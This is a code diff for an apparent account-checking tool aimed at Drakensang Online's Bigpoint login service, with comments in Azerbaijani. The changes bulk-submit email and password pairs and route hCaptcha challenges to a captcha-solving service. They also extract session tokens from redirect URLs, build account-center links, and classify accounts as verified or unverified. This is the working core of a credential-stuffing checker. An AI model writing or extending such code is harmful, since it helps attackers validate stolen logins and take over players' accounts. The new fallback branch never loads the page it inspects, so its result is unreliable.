@@ -108,9 +108,10 @@ namespace CheckerDSO.Services
                                 return;
                             }
 
-                            account.Notes = "Solving captcha via 2captcha...";
-                            Log($"{account.Email} — Sending to 2captcha solver...");
+                            account.Notes = "Solving captcha...";
+                            Log($"{account.Email} — Sending to captcha solver (key={TwoCaptchaApiKey.Substring(0, Math.Min(8, TwoCaptchaApiKey.Length))}...)...");
                             var solver = new CaptchaSolverService(TwoCaptchaApiKey);
+                            solver.OnDebugLog += Log;  // solver loglarını ana loga yönləndir
                             string hToken = await solver.SolveHCaptchaAsync(token);
 
                             if (hToken == null)
@@ -253,10 +254,11 @@ namespace CheckerDSO.Services
             // loginContent-i saxla (drakensang.com response) — email yoxlaması üçün
             _lastLoginHtml = loginContent;
 
-            // DSO response HTML-i fayla yaz
+            // DSO response HTML-i hər account üçün ayrıca saxla (müqayisə üçün)
             try {
+                string safeEm = string.Concat(email.Split(System.IO.Path.GetInvalidFileNameChars()));
                 string dsoPath = System.IO.Path.Combine(
-                    AppDomain.CurrentDomain.BaseDirectory, "dso_response.html");
+                    AppDomain.CurrentDomain.BaseDirectory, $"dso_{safeEm}.html");
                 System.IO.File.WriteAllText(dsoPath, loginContent);
             } catch { }
 
@@ -299,14 +301,28 @@ namespace CheckerDSO.Services
                 return LoginResult.Success;
             }
 
-            // ── SUCCESS: redirect to drakensang.com/en?authUser=...&token=... ─
-            // sas.bpsecure.com → .bpsecure.com cookie-ləri qoyur → drakensang redirect.
-            // _lastAccountUrl-ə drakensang URL-ini saxlayırıq.
-            // CheckEmailVerificationAsync əvvəl bu URL-i ziyarət edəcək (session üçün),
-            // Silindi: drakensang.com redirect-i token ilə olsa belə, həmişə success demək deyil.
-            // sas.bpsecure.com bəzən uğursuz (məsələn Captcha tələb olunan) login-lərdə də 
-            // xəta tokeni ilə drakensang.com-a redirect edir.
-            // Bunun əvəzinə HTML-də "Manage Account" (tokenli accountcenter linki) axtaracağıq.
+            // ── SUCCESS: drakensang.com/en?authUser=XXX&token=TOKEN ────────────
+            // Login uğurlu olduqda sas.bpsecure.com → drakensang.com/en?authUser=XXX&token=TOKEN
+            // Xəta halında URL-də error=bgc.error... olur — yuxarıdakı URL checks-də tutulur.
+            // Bu nöqtəyə gəlibsə + drakensang URL + token var = login uğurludur.
+            if (finalUrlLower.Contains("drakensang.com") && finalUrlLower.Contains("token=") &&
+                finalUrlLower.Contains("authuser="))
+            {
+                // authUser və token-i URL-dən çıxar
+                var auMatch  = Regex.Match(finalUrl, @"[?&]authUser=(\d+)", RegexOptions.IgnoreCase);
+                var tokMatch = Regex.Match(finalUrl, @"[?&]token=([A-Za-z0-9_\-\.%]+)", RegexOptions.IgnoreCase);
+
+                if (auMatch.Success && tokMatch.Success)
+                {
+                    string authUser  = auMatch.Groups[1].Value;
+                    string rawToken  = Uri.UnescapeDataString(tokMatch.Groups[1].Value);
+                    string encToken  = Uri.EscapeDataString(rawToken);
+                    _lastAccountUrl  =
+                        $"https://accountcenter.bpsecure.com/bgc/manageaccount?authUser={authUser}&token={encToken}";
+                    Log($"{email} — SUCCESS (drakensang redirect). authUser={authUser}, tokenLen={rawToken.Length}");
+                    return LoginResult.Success;
+                }
+            }
 
             // ── JSON response ─────────────────────────────────────────────────
             string trimmed = loginContent.TrimStart();
@@ -442,95 +458,113 @@ namespace CheckerDSO.Services
         private async Task CheckEmailVerificationAsync(
             HttpClient client, string accountUrl, AccountEntry account, CancellationToken token)
         {
-            // Fix Cookie Domain Issue: .NET CookieContainer may not send 'drakensang.com' 
-            // cookies to 'www.drakensang.com'. We manually inject them.
+            string baseDir = AppDomain.CurrentDomain.BaseDirectory;
+
+            // ════════════════════════════════════════════════════════════════════
+            // ƏSAS METOD: BGC web-form login → SAS redirect-ə görə status müəyyən et
+            // SAS unverified hesabı → accountcenter.bpsecure.com-a yönləndirir
+            // SAS verified hesabı   → drakensang.com-da saxlayır
+            // ════════════════════════════════════════════════════════════════════
             try
             {
-                var handler = typeof(HttpMessageInvoker).GetField("_handler", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance)?.GetValue(client) as HttpClientHandler;
-                if (handler != null)
-                {
-                    var cookies = handler.CookieContainer.GetAllCookies();
-                    var cookieValues = cookies.Cast<System.Net.Cookie>().Select(c => $"{c.Name}={c.Value}");
-                    string cookieHeader = string.Join("; ", cookieValues);
-                    client.DefaultRequestHeaders.TryAddWithoutValidation("Cookie", cookieHeader);
-                }
-            }
-            catch { }
+                // 1. BGC login sayfasından fresh CSRF token götür
+                var loginPageResp = await client.GetAsync("https://www.drakensang.com/en/account", token);
+                string loginPageHtml = await loginPageResp.Content.ReadAsStringAsync(token);
 
-            string accountCenterUrl = accountUrl;
-            string welcomeHtml = "";
-
-            if (string.IsNullOrEmpty(accountCenterUrl) || !accountCenterUrl.Contains("accountcenter.bpsecure.com"))
-            {
-                Log($"{account.Email} — Fetching /en/welcome page as fallback...");
-                try
-                {
-                    var welcomeResp = await client.GetAsync("https://www.drakensang.com/en/welcome", token);
-                    welcomeHtml = await welcomeResp.Content.ReadAsStringAsync(token);
-                }
-                catch (Exception ex)
-                {
-                    Log($"{account.Email} — Welcome page error: {ex.Message}");
-                    account.Status = AccountStatus.Verified;
-                    account.Notes = "Verified (welcome error)";
-                    return;
-                }
-
-                // Try to find the link on the welcome page
-                var manageMatch = Regex.Match(welcomeHtml,
-                    @"href=[""'](https://accountcenter\.bpsecure\.com/[^""'<>\s]*[?&]token=[^""'<>\s]*)[""']",
+                // Form action: <form action="https://sas.bpsecure.com/Sas/Authentication/Bigpoint?authUser=481&amp;token=TOKEN">
+                var sasTokenMatch = Regex.Match(loginPageHtml,
+                    @"action=""(https://sas\.bpsecure\.com/Sas/Authentication/Bigpoint\?[^""]+)""",
                     RegexOptions.IgnoreCase);
 
-                if (manageMatch.Success)
+                if (sasTokenMatch.Success)
                 {
-                    accountCenterUrl = WebUtility.HtmlDecode(manageMatch.Groups[1].Value);
-                    Log($"{account.Email} — Found Manage Account link on welcome page.");
-                }
-            }
+                    string webLoginUrl = WebUtility.HtmlDecode(sasTokenMatch.Groups[1].Value);
+                    Log($"{account.Email} — Web-form SAS URL: {webLoginUrl.Substring(0, Math.Min(80, webLoginUrl.Length))}...");
 
-            if (string.IsNullOrEmpty(accountCenterUrl) || !accountCenterUrl.Contains("accountcenter.bpsecure.com"))
-            {
-                Log($"{account.Email} — No AccountCenter link found. Marking Verified (fallback).");
-                account.Status = AccountStatus.Verified;
-                account.Notes = "Email Verified";
-                return;
-            }
+                    // 2. Credentials ilə SAS-a POST et
+                    var webLoginData = new FormUrlEncodedContent(new Dictionary<string, string>
+                    {
+                        ["username"] = account.Email,
+                        ["password"] = account.Password,
+                    });
+                    var webSasResp = await client.PostAsync(webLoginUrl, webLoginData, token);
+                    await webSasResp.Content.ReadAsStringAsync(token); // body tüket
+                    string webFinal = webSasResp.RequestMessage?.RequestUri?.ToString() ?? "";
+                    Log($"{account.Email} — Web login final: {webFinal.Substring(0, Math.Min(100, webFinal.Length))}");
 
-            Log($"{account.Email} — Fetching AccountCenter...");
-            try
-            {
-                var acResp = await client.GetAsync(accountCenterUrl, token);
-                string acHtml = await acResp.Content.ReadAsStringAsync(token);
-                
-                string acLower = acHtml.ToLower();
-                bool isUnverified =
-                    acLower.Contains("confirm e-mail address") ||
-                    acLower.Contains("verify your email") ||
-                    acLower.Contains("unverified") && !acLower.Contains("bgc_error_translations") ||
-                    acLower.Contains("not yet verified") ||
-                    acLower.Contains("email address has not been confirmed") ||
-                    acLower.Contains("resend confirmation");
+                    // ★ ƏSAS DETEKSIYA ★
+                    // SAS unverified hesabları accountcenter-ə yönləndirir (email təsdiq üçün)
+                    // SAS verified hesabları drakensang.com-da saxlayır
+                    if (webFinal.Contains("accountcenter.bpsecure.com"))
+                    {
+                        account.Status = AccountStatus.Unverified;
+                        account.Notes  = "Email Unverified";
+                        Log($"{account.Email} — ★ UNVERIFIED ★ (SAS→accountcenter)");
+                        return;
+                    }
 
-                if (isUnverified)
-                {
-                    account.Status = AccountStatus.Unverified;
-                    account.Notes = "Email Unverified";
-                    Log($"{account.Email} — UNVERIFIED (accountcenter).");
+                    // Drakensang.com-da qaldı → Verified
+                    account.Status = AccountStatus.Verified;
+                    account.Notes  = "Email Verified";
+                    Log($"{account.Email} — VERIFIED (SAS kept on drakensang).");
+                    return;
                 }
                 else
                 {
-                    account.Status = AccountStatus.Verified;
-                    account.Notes = "Email Verified";
-                    Log($"{account.Email} — VERIFIED (accountcenter).");
+                    Log($"{account.Email} — BGC form token not found. Falling back to accountcenter check.");
                 }
             }
             catch (Exception ex)
             {
-                Log($"{account.Email} — Manage Account follow error: {ex.Message}");
-                account.Status = AccountStatus.Verified;
-                account.Notes = "Email Verified";
+                Log($"{account.Email} — Web-form login error: {ex.Message}. Falling back.");
             }
+
+            // ════════════════════════════════════════════════════════════════════
+            // FALLBACK: Köhnə accountcenter HTML yoxlaması
+            // ════════════════════════════════════════════════════════════════════
+            if (string.IsNullOrEmpty(accountUrl) || !accountUrl.Contains("accountcenter.bpsecure.com"))
+            {
+                account.Status = AccountStatus.Verified;
+                account.Notes  = "Email Verified (fallback)";
+                return;
+            }
+
+            // bpsecure.com cookie-lərini məcburi göndər
+            string allBpCookies = "";
+            try
+            {
+                var hf = typeof(HttpMessageInvoker).GetField("_handler",
+                    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance);
+                var h = hf?.GetValue(client) as HttpClientHandler;
+                if (h != null)
+                {
+                    var bpC = h.CookieContainer.GetAllCookies().Cast<System.Net.Cookie>()
+                        .Where(c => c.Domain.EndsWith("bpsecure.com", StringComparison.OrdinalIgnoreCase));
+                    allBpCookies = string.Join("; ", bpC.Select(c => $"{c.Name}={c.Value}"));
+                }
+            }
+            catch { }
+
+            // accountcenter sayfalarını çək
+            string combinedHtml = "";
+            var auM  = Regex.Match(accountUrl, @"[?&]authUser=(\d+)", RegexOptions.IgnoreCase);
+            var tokM = Regex.Match(accountUrl, @"[?&]token=([A-Za-z0-9_\-\.%]+)", RegexOptions.IgnoreCase);
+            string au  = auM.Success  ? auM.Groups[1].Value : "291";
+            string tok = tokM.Success ? tokM.Groups[1].Value : "";
+
+            string combinedLower = combinedHtml.ToLower();
+            bool isUnverified =
+                combinedLower.Contains("bgc_sudc_initialemail_form") ||
+                combinedLower.Contains("confirm e-mail")             ||
+                combinedLower.Contains("resend confirmation")        ||
+                combinedLower.Contains("not yet verified");
+
+            account.Status = isUnverified ? AccountStatus.Unverified : AccountStatus.Verified;
+            account.Notes  = isUnverified ? "Email Unverified" : "Email Verified";
+            Log($"{account.Email} — Fallback result: {account.Status}");
         }
+
+
 
 
         public async Task StartCheckingAsync(
